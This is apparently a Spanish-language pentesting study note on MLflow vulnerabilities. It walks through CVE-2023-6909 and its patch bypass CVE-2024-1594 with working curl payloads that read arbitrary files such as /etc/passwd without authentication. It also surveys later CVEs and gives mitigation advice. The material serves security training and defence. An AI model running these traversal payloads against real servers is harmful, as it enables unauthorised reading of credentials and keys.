---
tags:
  - IA/Red-Team
  - IA
  - Pentesting/Explotacion
  - Web/Red-Team
Descripción: "MLflow es el servicio del stack de ML que más veces aparece expuesto sin autenticación, y su historial de path traversal a lectura arbitraria y RCE lo convierte en objetivo prioritario"
Fecha de actualización: 2026-07-29
Nota previa: "[[07 - Vulnerabilidades en el stack de ML]]"
Nota siguiente: "[[09 - Detección y evasión en aplicación y sistema]]"
Area: "[[Aplicación y sistema.base|Aplicación y sistema]]"
---
---

<mark style="background: #ADCCFFA6;">`MLflow` es la plataforma de gestión del ciclo de vida de proyectos de ML más extendida, y el servicio del stack que más veces aparece expuesto sin autenticación.</mark> Su `Tracking Server` ofrece una UI web y una API para registrar experimentos, servir modelos y evaluar. Esa API es la superficie, y su historial de `path traversal` a lectura arbitraria de ficheros —y de ahí a RCE— la convierte en objetivo prioritario en cualquier engagement de IA.

Merece nota propia por dos razones: acumula más CVEs explotables sin autenticación que cualquier otra pieza del stack, y es un caso de estudio perfecto de **cómo un parche insuficiente reabre la misma vulnerabilidad** una y otra vez.

# Conceptos mínimos

Dos términos de MLflow bastan para seguir los exploits:

- **`run`** — una ejecución concreta de un fragmento de código (un entrenamiento).
- **`experiment`** — una agrupación de `runs` para organizar el seguimiento. Un experimento `Clasificación de pingüinos` agrupa todos los `runs` de entrenar ese clasificador.

Los ataques abusan de los parámetros de ruta (`artifact_location`, `source`) que MLflow convierte de URL remota a ruta local **sin validar correctamente**.

# CVE-2023-6909: el path traversal original

> [!info]+ Fuente: [CVE-2023-6909](https://nvd.nist.gov/vuln/detail/CVE-2023-6909) (MLflow 2.7.1)
> LFI por conversión defectuosa de URL a ruta local. MLflow no valida los parámetros de la *query string*, que se anexan a rutas locales, permitiendo salir del directorio previsto con `../`.

La explotación encadena cuatro llamadas a la API sin autenticación. Primero, crear un experimento con el `payload` de traversal en `artifact_location` — nótese el `?` que fuerza el `payload` a la *query string*:

```shell-session
$ curl -X POST -H 'Content-Type: application/json' \
    -d '{"name": "pwn", "artifact_location": "http:///?/../../../../../../../../../"}' \
    'http://127.0.0.1:8080/ajax-api/2.0/mlflow/experiments/create'

{"experiment_id": "563025420075628626"}
```

Después, un `run` en ese experimento (guardar el `run_id`), un modelo registrado `pwn_model`, y una versión del modelo que enlaza modelo y `run` con `source` apuntando a la raíz del sistema de ficheros:

```shell-session
$ curl -X POST -H 'Content-Type: application/json' \
    -d '{"name": "pwn_model", "run_id": "<RUN_ID>", "source": "file:///"}' \
    'http://127.0.0.1:8080/ajax-api/2.0/mlflow/model-versions/create'
```

Con eso, se descarga cualquier fichero del servidor indicando su ruta relativa desde la raíz:

```shell-session
$ curl 'http://127.0.0.1:8080/model-versions/get-artifact?path=etc/passwd&name=pwn_model&version=1'

root:x:0:0:root:/root:/bin/bash
[...]
```

<mark style="background: #FFB86CA6;">Lectura arbitraria de ficheros sin autenticación</mark>: claves SSH, ficheros de configuración con credenciales de base de datos, tokens de nube. Desde ahí, la escalada a RCE suele ser un paso más. Es el mismo principio de la [[01 - Local File Inclusion (LFI)|Local File Inclusion]] web, aplicado a la API de un servicio de MLOps.

# CVE-2024-1594: el parche que no arregló nada

> [!info]+ Fuente: [CVE-2024-1594](https://nvd.nist.gov/vuln/detail/cve-2024-1594) (MLflow 2.9.2)
> El parche de CVE-2023-6909 comprobaba la secuencia `..` **solo en la query string**. El `payload` en un **fragmento de URL** (`#`) la evade.

El parche original añadió una comprobación de `..` en la *query string*. El `payload` viejo ahora se rechaza:

```shell-session
$ curl -X POST -H 'Content-Type: application/json' \
    -d '{"name": "pwn2", "artifact_location": "http:///?/../../../../../"}' \
    'http://127.0.0.1:8080/ajax-api/2.0/mlflow/experiments/create'

{"error_code": "INVALID_PARAMETER_VALUE", "message": "Invalid query string"}
```

Pero la comprobación solo mira la *query string*. Moviendo el traversal a un **fragmento** (`#`), la validación no lo ve:

```shell-session
$ curl -X POST -H 'Content-Type: application/json' \
    -d '{"name": "pwn2", "artifact_location": "http:///#../../../../../../../../../etc/"}' \
    'http://127.0.0.1:8080/ajax-api/2.0/mlflow/experiments/create'

{"experiment_id": "937441948891987093"}
```

A partir de ahí, la explotación es idéntica. <mark style="background: #8000E1A6;">Un parche que enumera dónde puede estar el `payload` en vez de resolver y validar la ruta canónica está condenado a que aparezca un sitio más donde ponerlo.</mark> Es la lección de diseño de esta nota: **la validación correcta canonicaliza la ruta final y comprueba que queda dentro del directorio permitido**, no busca cadenas prohibidas en trozos concretos de la URL.

# El MLflow de 2026: sigue igual de roto

HTB se queda en 2024. La sangría continúa, y las CVEs recientes son peores porque muchas van directas a RCE sin autenticación:

| CVE | Versión | Impacto |
| - | - | - |
| [CVE-2025-11201](https://zeropath.com/blog/cve-2025-11201-mlflow-directory-traversal-rce) | Tracking Server | `Directory traversal` → **RCE**. El parámetro `source` en la creación de modelos no se sanea |
| [CVE-2025-15379](https://www.sentinelone.com/vulnerability-database/cve-2025-15379/) | 3.8.0–3.8.1 | **Command injection** en la inicialización del contenedor de servido: `python_env.yaml` se interpola en un comando shell sin sanear. Parcheado en 3.8.2 |
| [CVE-2025-11200](https://radicalnotion.ai/vendor/mlflow/mlflow) | — | Bypass de autenticación por requisitos débiles de contraseña, CVSS 8.1 |
| [CVE-2025-14279](https://radicalnotion.ai/vendor/mlflow/mlflow) | REST server | **DNS rebinding** por falta de validación del `Origin` — un sitio web malicioso alcanza el MLflow del `localhost` de la víctima |
| CVE-2026-2033 + CVE-2026-2635 | Tracking Server | Bypass de autenticación a **RCE** vía traversal en la ruta de artefactos, sin autenticación |
| [CVE-2026-2611](https://www.sentinelone.com/vulnerability-database/cve-2026-2611/) | 3.9.0 | La feature `MLflow Assistant` expone `/ajax-api` sin validar `Origin` — RCE por `origin validation` cruzado contra el `loopback` de la víctima |

Dos patrones nuevos merecen atención porque cambian el modelo de amenaza:

- **DNS rebinding contra el `localhost`** (CVE-2025-14279, CVE-2026-2611). Ya no hace falta que MLflow esté expuesto a Internet: basta con que la víctima —un ingeniero de ML con MLflow en su máquina— visite una página web maliciosa, que rebota el DNS y alcanza el `127.0.0.1:5000`. El mecanismo exacto está en [[04 - DNS Rebinding para bypass de Same-Origin Policy|DNS rebinding contra la Same-Origin Policy]]. **Todo MLflow local sin validación de `Origin` es alcanzable desde el navegador.**
- **RCE directo sin autenticación** (CVE-2025-11201, CVE-2026-2033). Ya no hay que encadenar LFI con otra cosa: el traversal desemboca en ejecución de código de un salto.

<mark style="background: #FF5582A6;">Encontrar cualquier MLflow por debajo de la última versión es un hallazgo crítico casi garantizado.</mark> El fingerprinting es trivial: la UI se identifica sola, y la versión sale en las cabeceras o en `/version`.

# Detección y mitigación

- **Actualizar a la última versión, sin excepciones.** El historial de MLflow demuestra que cualquier versión con retraso tiene un RCE sin autenticar conocido. No hay "versión estable segura antigua".
- **Autenticación delante del Tracking Server.** MLflow no trae autenticación robusta; se pone un proxy inverso con autenticación (o el `basic auth` nativo, que CVE-2025-11200 demuestra que es débil) y, mejor, `mTLS`.
- **Validación de `Origin`** para cortar el DNS rebinding. Es la única defensa contra el vector desde el navegador, y hay que verificar explícitamente que está activa —varias CVEs son precisamente su ausencia.
- **Segmentación de red.** MLflow no debe ser alcanzable desde Internet ni desde red de usuario. Para el caso `localhost`, la validación de `Origin` es imprescindible porque la segmentación de red no protege del navegador de la propia víctima.
- **Escaneo con `nuclei`.** Hay plantillas para las CVEs de MLflow; incluirlas en el barrido inicial del engagement.
- **Mínimo privilegio del proceso.** El Tracking Server no debería correr como `root` ni con acceso al sistema de ficheros más allá de su directorio de artefactos. Reduce el impacto de un traversal que se cuele pese a todo.

> [!warning]+ El servicio que convierte un puesto de trabajo en RCE
> La combinación de MLflow local + DNS rebinding es especialmente traicionera en un engagement: no aparece en el escaneo de red externo porque el servicio solo escucha en `127.0.0.1`. Se descubre pensando en el **navegador del ingeniero de ML** como vector, no en el perímetro. Vale la pena preguntar en la fase de reconocimiento qué herramientas de MLOps corre el equipo en local.
